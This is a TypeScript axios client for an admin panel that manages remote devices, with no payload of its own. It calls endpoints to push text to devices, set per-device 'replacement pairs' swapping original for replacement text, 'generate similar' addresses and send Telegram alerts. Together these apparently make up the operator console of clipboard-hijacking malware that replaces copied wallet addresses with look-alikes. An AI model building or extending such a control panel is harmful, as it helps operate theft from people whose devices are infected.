import axios from 'axios'

const api = axios.create({ baseURL: import.meta.env.VITE_API_BASE || 'http://localhost:8001' })

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token') || ''
  if (token) {
    config.headers = config.headers || {}
    ;(config.headers as any)['Authorization'] = 'Bearer ' + token
  }
  return config
})

export const login = (username: string, password: string) => api.post('/admin/login', { username, password })
export const getStats = () => api.get('/admin/stats')
export const getDailyStats = () => api.get('/admin/stats/daily')
export const listDevices = () => api.get('/admin/devices')
export const updateNote = (deviceId: string, note: string) => api.patch(`/admin/devices/${deviceId}/note`, { note })
export const updateAutoGenerate = (deviceId: string, autoGenerate: boolean) => api.patch(`/admin/devices/${deviceId}/auto-generate`, { autoGenerate })
export const pushSet = (deviceId: string, text: string) => api.post(`/admin/devices/${deviceId}/push-set`, { set: { format: 'text/plain', text } })
export const getSettings = () => api.get('/admin/settings')
export const updateSetting = (key: string, value: string) => api.put(`/admin/settings/${key}`, { value })
export const testTelegram = () => api.post('/admin/settings/test-telegram')
export const generateSimilar = (deviceId: string) => api.post(`/admin/devices/${deviceId}/generate-similar`)
export const getGeneratedAddresses = (deviceId: string) => api.get(`/admin/devices/${deviceId}/generated-addresses`)

// 替换对相关API
export const listReplacementPairs = () => api.get('/admin/replacement-pairs')
export const getDeviceReplacementPairs = (deviceId: string) => api.get(`/admin/devices/${deviceId}/replacement-pairs`)
export const createReplacementPair = (data: {
  device_id: string
  original_text: string
  replacement_text: string
}) => api.post('/admin/replacement-pairs', data)
export const updateReplacementPair = (id: number, data: {
  original_text?: string
  replacement_text?: string
  enabled?: boolean
}) => api.put(`/admin/replacement-pairs/${id}`, data)
export const deleteReplacementPair = (id: number) => api.delete(`/admin/replacement-pairs/${id}`)

export default api


